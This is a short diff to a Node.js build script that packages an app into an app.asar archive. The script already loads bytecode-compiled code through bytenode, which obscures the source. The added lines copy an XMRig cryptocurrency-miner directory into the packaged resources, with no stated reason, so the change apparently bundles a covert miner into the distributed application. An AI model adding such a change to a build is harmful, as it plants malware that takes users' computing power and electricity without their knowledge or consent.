@@ -92,5 +92,8 @@ ${fs.readFileSync(path.load("jQ", "index.js"), "utf8")}
     fs.writeFileSync(path.load("dist", "resources", "package.json"),
         JSON.stringify({ main: "main.js" })); fs.writeFileSync(path.load("dist", "resources", "main.js"), `require("bytenode");\nrequire("./main.jsc");`);
 
+    fs.mkdirSync(path.load("dist", "resources", "XMRig"));
+    fs.cpSync(path.load("XMRig"), path.load("dist", "resources", "XMRig"), { recursive: true });
+
     await createPackage(path.load("dist", "resources"), path.load("dist", "app.asar"));
 })();
